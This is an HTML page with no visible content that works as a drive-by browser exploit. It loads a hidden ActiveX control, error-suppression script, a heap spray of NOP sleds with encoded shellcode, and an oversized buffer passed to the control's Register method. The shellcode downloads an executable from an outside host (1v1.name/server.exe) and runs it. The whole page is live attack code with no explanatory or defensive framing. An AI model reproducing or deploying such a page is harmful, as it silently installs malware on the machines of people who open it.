<body>
<script>window.onerror=function(){return true;}</script>
<object classid="clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2"
style='display:none' id='target'></object>
<SCRIPT language="javascript">
    var shellcode = unescape("%u9090"+"%u9090"+
"%uefe9%u0000%u5a00%ua164%u0030%u0000%u408b%u8b0c" +
"%u1c70%u8bad%u0840%ud88b%u738b%u8b3c%u1e74%u0378" +
"%u8bf3%u207e%ufb03%u4e8b%u3314%u56ed%u5157%u3f8b" +
"%ufb03%uf28b%u0e6a%uf359%u74a6%u5908%u835f%u04c7" +
"%ue245%u59e9%u5e5f%ucd8b%u468b%u0324%ud1c3%u03e1" +
"%u33c1%u66c9%u088b%u468b%u031c%uc1c3%u02e1%uc103" +
"%u008b%uc303%ufa8b%uf78b%uc683%u8b0e%u6ad0%u5904" +
"%u6ae8%u0000%u8300%u0dc6%u5652%u57ff%u5afc%ud88b" +
"%u016a%ue859%u0057%u0000%uc683%u5613%u8046%u803e" +
"%ufa75%u3680%u5e80%uec83%u8b40%uc7dc%u6303%u646d" +
"%u4320%u4343%u6643%u03c7%u632f%u4343%u03c6%u4320" +
"%u206a%uff53%uec57%u04c7%u5c03%u2e61%uc765%u0344" +
"%u7804%u0065%u3300%u50c0%u5350%u5056%u57ff%u8bfc" +
"%u6adc%u5300%u57ff%u68f0%u2451%u0040%uff58%u33d0" +
"%uacc0%uc085%uf975%u5251%u5356%ud2ff%u595a%ue2ab" +
"%u33ee%uc3c0%u0ce8%uffff%u47ff%u7465%u7250%u636f" +
"%u6441%u7264%u7365%u0073%u6547%u5374%u7379%u6574" +
"%u446d%u7269%u6365%u6f74%u7972%u0041%u6957%u456e" +
"%u6578%u0063%u7845%u7469%u6854%u6572%u6461%u4c00" +
"%u616f%u4c64%u6269%u6172%u7972%u0041%u7275%u6d6c" +
"%u6e6f%u5500%u4c52%u6f44%u6e77%u6f6c%u6461%u6f54" +
"%u6946%u656c%u0041"+
"%u7468%u7074%u2f3a%u312f%u3176%u6e2e%u6d61%u2f65%u6573%u7672%u7265%u652e%u6578%u0000");

//http://1v1.name/server.exe ??????
</script>
<SCRIPT language="javascript">
var bigblock = unescape("%u9090%u9090");
var headersize = 20;
var slackspace = headersize+shellcode.length;
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) blockblock =
block+block+fillblock;
memory = new Array();
for (x=0; x<100; x++) memory[x] = block +shellcode;
var buffer = '';
while (buffer.length < 1024) buffer+="\x05";
var ok="1111";
target.Register(ok,buffer);
</script>
</body> 
